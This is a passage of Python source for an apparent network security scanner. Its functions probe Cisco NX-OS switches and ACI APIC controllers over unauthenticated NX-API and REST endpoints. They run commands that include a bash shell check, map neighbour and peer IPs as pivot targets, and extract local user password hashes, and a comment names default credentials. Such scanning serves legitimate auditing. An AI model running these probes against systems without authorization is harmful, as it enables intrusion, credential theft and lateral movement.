    # --- 10. TLS cert OU: "dcapic" pattern confirms APIC identity -----------
    try:
        raw_sock = socket.create_connection((host, port), timeout=timeout)
        tls_sock = ctx.wrap_socket(raw_sock, server_hostname=host)
        cert = tls_sock.getpeercert()
        tls_sock.close()
        if cert:
            for rdn in cert.get("subject", ()):
                for attr, value in rdn:
                    if attr == "organizationalUnitName" and "dcapic" in value.lower():
                        findings.append({
                            "severity": "HIGH",
                            "title": "ACI_CERT_OU_DETECTED",
                            "detail": (
                                f"TLS certificate on {host}:{port} has OU="
                                f"'{value}' matching the Cisco APIC certificate "
                                "pattern ('dcapic').  This confirms the target is "
                                "a Cisco APIC controller regardless of hostname or "
                                "HTTP response content."
                            ),
                            "host": host,
                            "port": port,
                        })
    except OSError:
        pass

    return findings


def probe_nxos_onbox_python_execution(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect Cisco NX-OS on-box Python execution and EEM (Embedded Event Manager) attack surface.

    NX-OS 6.1(2)+ (Nexus 7000) and 5.1(3)N2+ (Nexus 5500) ship Python directly on the switch.
    Scripts run with full CLI access via cisco.CLI(), write to /bootflash/, and may be configured
    as bootup-scripts that execute every boot cycle.  EEM (Embedded Event Manager) applets can
    trigger 'action cli command' sequences or invoke Python scripts on network events (syslog
    match, timer, interface state change) with no additional authentication.

    Probes via NX-API CLI POST (/ins) without credentials — a 200 response confirms the
    automation surface is fully readable from any host with TCP access to port 80/443.

    Source: Cisco NX-OS 2nd Ed., Ch. 7 (Embedded Serviceability Features): Python, POAP,
    and EEM sections; NX-OS Programmability Guide, NX-API CLI chapter.

    Args:
        host: Target IP or hostname.
        port: HTTP port (default 80); HTTPS on 443 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []

    def _nxapi_post(scheme: str, p: int, cmd: str, cli_type: str = "cli_show") -> tuple:
        """POST NX-API CLI command; return (http_status, body_str) or (None, '')."""
        url = f"{scheme}://{host}:{p}/ins"
        payload = json.dumps({
            "ins_api": {
                "version": "1.0",
                "type": cli_type,
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }).encode()
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(65536).decode("utf-8", errors="replace")
            try:
                rdict = json.loads(raw)
                out = rdict.get("ins_api", {}).get("outputs", {}).get("output", {})
                if isinstance(out, list):
                    out = out[0] if out else {}
                body = out.get("body", "")
                if isinstance(body, dict):
                    body = json.dumps(body)
                return resp.status, str(body) if body else raw[:256]
            except (ValueError, KeyError, AttributeError):
                return resp.status, raw[:256]
        except urllib.error.HTTPError as exc:
            return exc.code, ""
        except (urllib.error.URLError, OSError):
            return None, ""

    for scheme, p in [("http", port), ("https", 443)]:
        # --- show version: full device fingerprint ---
        status, body = _nxapi_post(scheme, p, "show version")
        if status == 200 and len(body) > 20:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_VERSION_DISCLOSED",
                "detail": (
                    f"NX-API POST /ins 'show version' returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p}; full device version string exposed without credentials "
                    f"({len(body)} bytes). NX-OS version fingerprint enables precise CVE "
                    "targeting — platform, kickstart version, and system image are disclosed."
                ),
                "host": host,
                "port": p,
            })
            model_m = re.search(
                r"(?i)(cisco\s+nexus[\w\s]+|N\d+\w*\s+Chassis)", body
            )
            kick_m = re.search(
                r"(?i)kickstart[\s:]+version[\s:]+([^\n\r,]{1,50})", body
            )
            sys_m = re.search(
                r"(?i)system[\s:]+version[\s:]+([^\n\r,]{1,50})", body
            )
            if model_m or kick_m or sys_m:
                parts = []
                if model_m:
                    parts.append(f"model={model_m.group(0).strip()[:60]}")
                if kick_m:
                    parts.append(f"kickstart={kick_m.group(1).strip()}")
                if sys_m:
                    parts.append(f"system={sys_m.group(1).strip()}")
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NXOS_DETAILED_VERSION",
                    "detail": (
                        f"Parsed NX-OS version details from unauthenticated 'show version' "
                        f"on {scheme}:{p}: {'; '.join(parts)}. "
                        "Platform and software version allow precise CVE scope narrowing."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show python: on-box Python scripting enabled ---
        status, body = _nxapi_post(scheme, p, "show python")
        if status == 200 and body:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_PYTHON_ENABLED",
                "detail": (
                    f"NX-API POST /ins 'show python' returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p}; on-box Python scripting is enabled and accessible "
                    f"without credentials ({len(body)} bytes). "
                    "Python on NX-OS (6.1(2)+/5.1(3)N2+) runs in /bootflash with full CLI "
                    "access via cisco.CLI(), enabling config mutation and persistent script "
                    "staging from any host with unauthenticated NX-API access."
                ),
                "host": host,
                "port": p,
            })

        # --- show python bootup-script: persistent boot-cycle execution ---
        status, body = _nxapi_post(scheme, p, "show python bootup-script")
        if status == 200 and len(body) > 5:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_PYTHON_BOOTUP_SCRIPT",
                "detail": (
                    f"NX-API POST /ins 'show python bootup-script' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; a Python bootup script is configured "
                    f"({len(body)} bytes). Bootup scripts execute at every switch startup "
                    "with full NX-OS CLI privilege — a persistent arbitrary code execution "
                    "mechanism that survives reload and config rollback."
                ),
                "host": host,
                "port": p,
            })

        # --- show event manager policy all: EEM policy inventory ---
        status, body = _nxapi_post(scheme, p, "show event manager policy all")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_EEM_POLICIES_LISTED",
                "detail": (
                    f"NX-API POST /ins 'show event manager policy all' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; full EEM (Embedded Event Manager) "
                    f"policy inventory exposed ({len(body)} bytes). EEM applets and scripts "
                    "execute on system events (syslog match, timer, interface-state) with "
                    "no additional authentication — persistent switch automation attack surface."
                ),
                "host": host,
                "port": p,
            })
            if re.search(r"(?i)action\s+\d*\s*cli\s+command", body):
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_EEM_CLI_ACTION",
                    "detail": (
                        f"EEM policy listing on {scheme}:{p} contains 'action cli command' "
                        "directives — user-defined applets with CLI execution actions are present. "
                        "These execute arbitrary NX-OS CLI on trigger events with no operator "
                        "interaction, frequently embedding cleartext credentials in action strings."
                    ),
                    "host": host,
                    "port": p,
                })
            if re.search(r"(?i)(\.py\b|python|event manager script)", body):
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_EEM_PYTHON_POLICY",
                    "detail": (
                        f"EEM policy listing on {scheme}:{p} references Python scripts "
                        "(.py / python / event manager script keyword). EEM policies invoking "
                        "Python provide persistent arbitrary code execution on the switch "
                        "management plane triggered by network events."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- NX-API bash type: Bash shell access (equivalent to 'run bash pwd') ---
        status, body = _nxapi_post(scheme, p, "pwd", cli_type="bash")
        if status == 200 and body:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_BASH_SHELL_ACCESS",
                "detail": (
                    f"NX-API POST /ins type=bash 'pwd' (NX-OS 'run bash pwd') returned "
                    f"HTTP 200 unauthenticated on {scheme}:{p}; Bash shell execution "
                    f"accessible without credentials ({len(body)} bytes). "
                    "NX-OS Bash runs as root on the underlying Linux kernel — complete "
                    "switch compromise from any host with unauthenticated NX-API access."
                ),
                "host": host,
                "port": p,
            })
            if re.search(r"(/bootflash|/isan|/volatile|/var/tmp)", body):
                path_m = re.search(r"(/[a-zA-Z0-9_./-]+)", body)
                disclosed = path_m.group(1) if path_m else body.strip()[:60]
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_BASH_PATH_DISCLOSED",
                    "detail": (
                        f"Bash shell response on {scheme}:{p} discloses filesystem path: "
                        f"'{disclosed}'. /bootflash is the persistent NVRAM-backed storage "
                        "for scripts and configs; /isan contains NX-OS binaries — both are "
                        "primary staging points for persistent implant deployment."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show virtual-service list: Guest Shell activation state ---
        status, body = _nxapi_post(scheme, p, "show virtual-service list")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_GUESTSHELL_STATUS",
                "detail": (
                    f"NX-API POST /ins 'show virtual-service list' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; virtual service inventory exposed "
                    f"({len(body)} bytes). Lists Guest Shell (guestshell+) and third-party "
                    "container activation state without credentials."
                ),
                "host": host,
                "port": p,
            })
            if re.search(r"(?i)guestshell\+?\s+Activated", body):
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_GUESTSHELL_ACTIVE",
                    "detail": (
                        f"Guest Shell (guestshell+) is Activated on {scheme}:{p}; "
                        "the LXC container provides persistent Python execution, yum-installable "
                        "packages, and outbound network access from the switch management plane — "
                        "a persistent container foothold requiring no NX-OS privilege escalation."
                    ),
                    "host": host,
                    "port": p,
                })

    return findings


def probe_nxos_fabric_extender_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco FEX (Fabric Extender) and VPC domain exposure via NX-OS NX-API.

    Nexus 2000 FEX units are managed entirely by the parent switch (Nexus 5000/7000);
    'show fex' on the parent exposes the complete server access layer topology.
    Virtual Port-Channel (vPC) peer-keepalive output discloses the management IP of
    the redundant supervisor — a direct lateral movement target within the DC management
    network.  CDP/LLDP neighbor detail enumerates all attached devices with OS version
    strings, enabling targeted exploitation of the entire adjacent network segment.
    POAP (Power On Auto Provisioning) is enabled by default on NX-OS 6.1(2)+; the
    DME poap MO confirms provisioning attack surface availability.

    Source: Cisco NX-OS 2nd Ed., Ch. 1 (NX-OS Overview: FEX/vPC architecture),
    Ch. 7 (POAP section, Smart Call Home CDP config), Ch. 2 (L2: STP, VPC, port-channel).

    Args:
        host: Target IP or hostname.
        port: HTTPS port (default 443); HTTP on 80 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []

    def _nxapi_post(scheme: str, p: int, cmd: str) -> tuple:
        """POST NX-API cli_show command; return (http_status, body_str) or (None, '')."""
        url = f"{scheme}://{host}:{p}/ins"
        payload = json.dumps({
            "ins_api": {
                "version": "1.0",
                "type": "cli_show",
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }).encode()
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(65536).decode("utf-8", errors="replace")
            try:
                rdict = json.loads(raw)
                out = rdict.get("ins_api", {}).get("outputs", {}).get("output", {})
                if isinstance(out, list):
                    out = out[0] if out else {}
                body = out.get("body", "")
                if isinstance(body, dict):
                    body = json.dumps(body)
                return resp.status, str(body) if body else raw[:256]
            except (ValueError, KeyError, AttributeError):
                return resp.status, raw[:256]
        except urllib.error.HTTPError as exc:
            return exc.code, ""
        except (urllib.error.URLError, OSError):
            return None, ""

    for scheme, p in [("https", port), ("http", 80)]:
        # --- show fex: Fabric Extender attachment list ---
        status, body = _nxapi_post(scheme, p, "show fex")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_FEX_ATTACHED_LISTED",
                "detail": (
                    f"NX-API POST /ins 'show fex' returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p}; Fabric Extender (FEX/Nexus 2000) attachment list "
                    f"exposed ({len(body)} bytes). FEX units are managed as remote line "
                    "cards; their topology reveals the complete physical server access "
                    "layer architecture managed by this parent switch."
                ),
                "host": host,
                "port": p,
            })
            fex_ids = re.findall(r"\b(1\d{2})\b", body)
            if fex_ids:
                unique_fex = list(dict.fromkeys(fex_ids))[:10]
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_FEX_TOPOLOGY_DISCLOSED",
                    "detail": (
                        f"FEX topology from 'show fex' on {scheme}:{p}: "
                        f"FEX IDs {', '.join(unique_fex)}. "
                        "FEX IDs map to physical chassis locations in the server access "
                        "layer, enabling targeted interference with downstream host "
                        "connectivity by manipulating FEX port configurations."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show vpc: Virtual Port-Channel domain configuration ---
        status, body = _nxapi_post(scheme, p, "show vpc")
        if status == 200 and len(body) > 10:
            domain_m = re.search(r"(?i)vpc\s+domain\s+id\s*[:\s]+(\d+)", body)
            domain_str = f" vPC domain-id: {domain_m.group(1)}" if domain_m else ""
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_VPC_DOMAIN_DISCLOSED",
                "detail": (
                    f"NX-API POST /ins 'show vpc' returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p}; Virtual Port-Channel (vPC) domain configuration "
                    f"exposed ({len(body)} bytes).{domain_str} vPC enables dual-supervisor "
                    "EtherChannel without STP blocking — domain topology discloses the "
                    "redundancy architecture and peer switch identity."
                ),
                "host": host,
                "port": p,
            })

        # --- show vpc peer-keepalive: peer management IP disclosure ---
        status, body = _nxapi_post(scheme, p, "show vpc peer-keepalive")
        if status == 200 and len(body) > 10:
            peer_m = re.search(
                r"(?i)(?:destination|peer[\s-]*ip|peer[\s-]*address)"
                r"[:\s]+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})",
                body,
            )
            peer_ip = peer_m.group(1) if peer_m else "(unparsed)"
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_VPC_PEER_IP",
                "detail": (
                    f"NX-API POST /ins 'show vpc peer-keepalive' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; vPC peer keepalive IP disclosed: "
                    f"{peer_ip}. The peer keepalive IP is the management-plane address of "
                    "the redundant supervisor switch — a direct pivot target for lateral "
                    "movement within the data center management network."
                ),
                "host": host,
                "port": p,
            })

        # --- show cdp neighbors detail: full neighbor topology ---
        status, body = _nxapi_post(scheme, p, "show cdp neighbors detail")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_CDP_TOPOLOGY_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show cdp neighbors detail' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; full CDP neighbor topology exposed "
                    f"({len(body)} bytes). CDP detail includes device type, platform, "
                    "IOS/NX-OS version, management IP addresses, and local/remote interface "
                    "identifiers — a complete map of adjacent network infrastructure."
                ),
                "host": host,
                "port": p,
            })
            cdp_ips = re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", body)
            cdp_plats = re.findall(
                r"(?i)(?:Platform|Device\s+ID)[:\s]+([^\n\r]{1,60})", body
            )
            if cdp_ips or cdp_plats:
                ip_sample = ", ".join(list(dict.fromkeys(cdp_ips))[:8])
                plat_sample = "; ".join([item.strip()[:40] for item in cdp_plats[:4]])
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_CDP_NEIGHBORS_PARSED",
                    "detail": (
                        f"CDP neighbor detail parsing on {scheme}:{p} — "
                        f"neighbor IPs: [{ip_sample}]; "
                        f"platforms: [{plat_sample}]. "
                        "Neighbor IPs are direct pivot targets; platform/version strings "
                        "enable targeted exploitation of all adjacent devices."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show lldp neighbors detail: vendor-neutral topology ---
        status, body = _nxapi_post(scheme, p, "show lldp neighbors detail")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_LLDP_TOPOLOGY_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show lldp neighbors detail' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; LLDP neighbor topology exposed "
                    f"({len(body)} bytes). LLDP detail includes system name, system "
                    "description (OS + version), management address, and capability flags — "
                    "vendor-neutral network map readable without credentials."
                ),
                "host": host,
                "port": p,
            })

        # --- show interface brief: full interface inventory ---
        status, body = _nxapi_post(scheme, p, "show interface brief")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_INTERFACES_LISTED",
                "detail": (
                    f"NX-API POST /ins 'show interface brief' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; full interface inventory exposed "
                    f"({len(body)} bytes). Output includes all Ethernet, port-channel, "
                    "VLAN SVI, and management interfaces with operational state, speed, "
                    "and VLAN membership."
                ),
                "host": host,
                "port": p,
            })

        # --- show spanning-tree: STP topology including root bridge ID ---
        status, body = _nxapi_post(scheme, p, "show spanning-tree")
        if status == 200 and len(body) > 10:
            root_m = re.search(
                r"(?i)Root\s+ID[\s\S]{0,120}?Address\s+([0-9a-fA-F:.]+)",
                body,
            )
            root_str = f" Root bridge MAC: {root_m.group(1)}" if root_m else ""
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_STP_TOPOLOGY",
                "detail": (
                    f"NX-API POST /ins 'show spanning-tree' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p}; STP topology including VLAN "
                    f"instance state and root bridge selection exposed ({len(body)} bytes)."
                    f"{root_str} Root bridge MAC enables BPDU crafting for STP "
                    "manipulation and traffic interception."
                ),
                "host": host,
                "port": p,
            })

        # --- POAP DME MO: Power On Auto Provisioning active ---
        # POAP is enabled by default on NX-OS 6.1(2)+ (Ch. 7: Power On Auto-Provisioning).
        # When enabled, the switch bootstraps via DHCP + TFTP Python script; the poap MO
        # in the NX-OS DME REST interface exposes its configuration state.
        poap_url = f"{scheme}://{host}:{p}/api/mo/sys/poap.json"
        try:
            poap_req = urllib.request.Request(
                poap_url,
                headers={"Accept": "application/json"},
            )
            if scheme == "https":
                poap_opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                poap_opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            poap_resp = poap_opener.open(poap_req, timeout=timeout)
            if poap_resp.status == 200:
                poap_body = poap_resp.read(4096)
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_POAP_ACTIVE",
                    "detail": (
                        f"GET /api/mo/sys/poap.json returned HTTP 200 unauthenticated "
                        f"on {scheme}:{p}; POAP (Power On Auto Provisioning) status MO "
                        f"accessible ({len(poap_body)} bytes). POAP is enabled by default "
                        "on NX-OS 6.1(2)+ and bootstraps via DHCP + TFTP Python script — "
                        "a supply-chain attack vector for newly provisioned Nexus switches."
                    ),
                    "host": host,
                    "port": p,
                })
        except (urllib.error.URLError, OSError, urllib.error.HTTPError):
            pass

    return findings


def probe_aci_apic_cluster_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco ACI APIC cluster configuration and fabric discovery surface.

    The Application Policy Infrastructure Controller (APIC) cluster is the
    management plane for Cisco ACI fabrics.  Deployed as a minimum 3-node cluster
    (controller IDs 1-19, default cluster size 3) on UCS C-Series appliances, the
    APICs manage all fabric policy via a REST API over HTTPS/443.  During initial
    setup the operator assigns an out-of-band management IP per APIC (mgmt0 port),
    a TEP pool for fabric tunnel endpoints (default 10.0.0.0/16), and an infra VLAN
    (experience-recommended: 3967).

    The APIC MIT (Management Information Tree) exposes cluster state, fabric
    topology, and user accounts via /api/node/class/* endpoints.  When the APIC
    permits unauthenticated reads of these endpoints an attacker obtains:
    - Complete fabric node inventory (leaf/spine IDs, roles, OOB management IPs)
    - APIC cluster membership (infraWiNode) including OOB addresses of every APIC
    - Local user account list including hashed credentials (aaaUser)
    - Infra controller object (infraCont) confirming TEP pool and infra VLAN
    Default credentials (admin / C1sco12345) are common in lab and staged fabrics.

    Source: Deploying ACI: The Complete Guide, Ch. 2 "Building a Fabric" (cluster
    sizing, APIC IDs, TEP pool), Ch. 3 "Bringing Up a Fabric" (OOB management
    setup dialog, APIC controller connections, CIMC configuration).

    Args:
        host: Target IP or hostname of the APIC.
        port: HTTPS port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f"https://{host}:{port}"
    _headers = {
        "Accept": "application/json",
        "User-Agent": "ablation/1.0",
    }

    def _get(path: str) -> tuple:
        """Return (status, body_bytes) or (None, b'') on network error."""
        req = urllib.request.Request(base + path, headers=_headers)
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(131072)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except (urllib.error.URLError, OSError):
            return None, b""

    def _post(path: str, payload: bytes) -> tuple:
        """Return (status, body_bytes) or (None, b'') on network error."""
        req = urllib.request.Request(
            base + path,
            data=payload,
            method="POST",
            headers={**_headers, "Content-Type": "application/json"},
        )
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(65536)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except (urllib.error.URLError, OSError):
            return None, b""

    def _parse_attrs(body: bytes) -> list:
        """Extract list of 'attributes' dicts from APIC imdata JSON response."""
        try:
            data = json.loads(body.decode("utf-8", errors="replace"))
            return [
                obj[list(obj.keys())[0]].get("attributes", {})
                for obj in data.get("imdata", [])
                if obj and list(obj.keys())
            ]
        except (ValueError, KeyError, IndexError, AttributeError):
            return []

    # --- infraCont: fabric infrastructure controller ---------------------------
    # infraCont holds the fabric domain name, infra VLAN, TEP pool, and APIC
    # cluster size.  Unauthenticated read confirms the APIC is the fabric controller
    # and discloses core provisioning parameters set during initial setup (Ch. 3).
    status, body = _get("/api/node/class/infraCont.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        tep_pool = ""
        infra_vlan = ""
        fabric_name = ""
        if attrs_list:
            a = attrs_list[0]
            tep_pool = a.get("allocMode", "") or a.get("infraIp", "")
            infra_vlan = a.get("infraVlan", "")
            fabric_name = a.get("dn", "")
        detail_extra = ""
        if tep_pool or infra_vlan:
            detail_extra = (
                f" TEP pool: {tep_pool or 'n/a'}, infra VLAN: {infra_vlan or 'n/a'}."
            )
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_FABRIC_CONTROLLER_UNAUTH",
            "detail": (
                f"GET /api/node/class/infraCont.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; ACI fabric infrastructure controller object accessible "
                f"({len(body)} bytes).{detail_extra} infraCont confirms this host is the "
                "APIC SDN controller for the ACI fabric. TEP pool and infra VLAN are "
                "provisioned during initial APIC setup and cannot be changed without a "
                "full fabric rebuild — their disclosure confirms the infra addressing scheme."
            ),
            "host": host,
            "port": port,
        })

    # --- infraNodeP: node profile list ----------------------------------------
    status, body = _get("/api/node/class/infraNodeP.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        count = len(attrs_list)
        findings.append({
            "severity": "HIGH",
            "title": "ACI_NODE_PROFILES_UNAUTH",
            "detail": (
                f"GET /api/node/class/infraNodeP.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {count} node profile(s) exposed ({len(body)} bytes). "
                "Node profiles bind leaf/spine nodes to interface and switch profiles, "
                "mapping the physical access policy fabric. Enumeration enables targeted "
                "policy injection by identifying named switch selection objects."
            ),
            "host": host,
            "port": port,
        })

    # --- fabricNode: all fabric nodes (leafs, spines, APICs) ------------------
    # fabricNode lists every node discovered by the APIC fabric discovery protocol
    # (LLDP-based).  Each entry includes: node ID, TEP address, OOB management IP,
    # role (leaf/spine/controller), model, and fabricSt (active/inactive/unknown).
    status, body = _get("/api/node/class/fabricNode.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        count = len(attrs_list)
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_FABRIC_TOPOLOGY_UNAUTH",
            "detail": (
                f"GET /api/node/class/fabricNode.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {count} fabric node(s) listed ({len(body)} bytes). "
                "Complete spine-leaf fabric topology disclosed unauthenticated — every "
                "Nexus 9000 node ID, role, model, and discovery state is exposed."
            ),
            "host": host,
            "port": port,
        })
        # Parse individual node details: role, id, address, model, fabricSt
        node_details = []
        for a in attrs_list:
            role = a.get("role", "")
            node_id = a.get("id", "")
            address = a.get("address", "")
            model = a.get("model", "")
            fab_st = a.get("fabricSt", "")
            if role or node_id:
                node_details.append(
                    f"node-{node_id} role={role} addr={address} model={model} st={fab_st}"
                )
        if node_details:
            findings.append({
                "severity": "CRITICAL",
                "title": "ACI_FABRIC_NODE_DETAILS",
                "detail": (
                    f"ACI fabric node inventory from fabricNode on {host}:{port}: "
                    + "; ".join(node_details[:20])
                    + (f" (+ {len(node_details) - 20} more)" if len(node_details) > 20 else "")
                    + ". Node IDs, TEP addresses, and models enable targeted exploitation "
                    "of individual leaf/spine/controller nodes by role."
                ),
                "host": host,
                "port": port,
            })

    # --- fabricPod: fabric pod topology ---------------------------------------
    status, body = _get("/api/node/class/fabricPod.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        pod_ids = [a.get("id", "") for a in attrs_list if a.get("id")]
        findings.append({
            "severity": "HIGH",
            "title": "ACI_POD_TOPOLOGY_UNAUTH",
            "detail": (
                f"GET /api/node/class/fabricPod.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} pod(s) listed ({len(body)} bytes). "
                f"Pod IDs: {', '.join(pod_ids) or 'n/a'}. Pod topology disclosure "
                "reveals Multi-Pod boundaries and inter-pod IPN (Inter-Pod Network) "
                "addressing, enabling targeted disruption of cross-pod VXLAN traffic."
            ),
            "host": host,
            "port": port,
        })

    # --- infraWiNode: APIC cluster member nodes --------------------------------
    # infraWiNode enumerates every APIC in the cluster with health state, OOB
    # management IP, and cluster role.  The minimum ACI cluster is 3 APICs; the
    # setup dialog assigns OOB management IPs during initial provisioning (Ch. 3).
    status, body = _get("/api/node/class/infraWiNode.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        count = len(attrs_list)
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_APIC_CLUSTER_NODES",
            "detail": (
                f"GET /api/node/class/infraWiNode.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {count} APIC cluster node(s) listed ({len(body)} bytes). "
                "APIC cluster membership exposed — minimum 3-node cluster required for "
                "ACI; larger deployments may have 5+ APICs. Cluster nodes are added in "
                "odd increments to maintain quorum against split-brain scenarios."
            ),
            "host": host,
            "port": port,
        })
        # Extract OOB management IPs from cluster nodes
        oob_ips = []
        for a in attrs_list:
            oob = a.get("oobIpv4Addr", "") or a.get("addr", "") or a.get("ip", "")
            node_name = a.get("nodeName", "") or a.get("id", "")
            if oob and oob not in ("0.0.0.0", ""):
                oob_ips.append(f"{node_name}={oob}")
        if oob_ips:
            findings.append({
                "severity": "CRITICAL",
                "title": "ACI_APIC_OOBMGMT_IPS",
                "detail": (
                    f"APIC cluster OOB management IPs from infraWiNode on {host}:{port}: "
                    + ", ".join(oob_ips[:10])
                    + ". OOB mgmt0 ports on APIC appliances are also connected to CIMC "
                    "(Cisco Integrated Management Controller) for lights-out management; "
                    "these IPs are direct attack surface for hardware-level access."
                ),
                "host": host,
                "port": port,
            })

    # --- uni/controller: APIC controller MO -----------------------------------
    status, body = _get("/api/node/mo/uni/controller.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        ctrl_name = attrs_list[0].get("name", "") if attrs_list else ""
        findings.append({
            "severity": "HIGH",
            "title": "ACI_CONTROLLER_INFO_UNAUTH",
            "detail": (
                f"GET /api/node/mo/uni/controller.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; controller MO accessible ({len(body)} bytes). "
                f"Controller name: {ctrl_name or 'n/a'}. The uni/controller MO is the "
                "root of the APIC cluster configuration subtree; its accessibility "
                "unauthenticated is a prerequisite for many privilege-escalation paths."
            ),
            "host": host,
            "port": port,
        })

    # --- aaaUser: local user accounts -----------------------------------------
    # ACI RBAC creates local accounts in aaaUser; entries include username, pwd
    # (hashed), last login, and assigned roles.  Default admin account is always
    # present.  RADIUS/TACACS+ auth is configured separately; local accounts remain
    # as backup authentication (Ch. 3 "RBAC" section).
    status, body = _get("/api/node/class/aaaUser.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        count = len(attrs_list)
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_LOCAL_USERS_UNAUTH",
            "detail": (
                f"GET /api/node/class/aaaUser.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {count} local user account(s) exposed ({len(body)} bytes). "
                "Local accounts include the built-in admin and any additional users; "
                "RBAC policy assigns roles (admin/read-only/tenant-admin etc.) per account."
            ),
            "host": host,
            "port": port,
        })
        # Extract usernames and hashed passwords
        user_details = []
        for a in attrs_list:
            uname = a.get("name", "")
            pwd = a.get("pwd", "")
            last_login = a.get("lastLoginTime", "")
            if uname:
                entry = f"{uname}"
                if pwd and pwd not in ("", "**"):
                    entry += f" (hash:{pwd[:32]}...)"
                if last_login:
                    entry += f" last={last_login}"
                user_details.append(entry)
        if user_details:
            findings.append({
                "severity": "CRITICAL",
                "title": "ACI_USER_CREDS_DISCLOSED",
                "detail": (
                    f"ACI local user accounts from aaaUser on {host}:{port}: "
                    + "; ".join(user_details[:15])
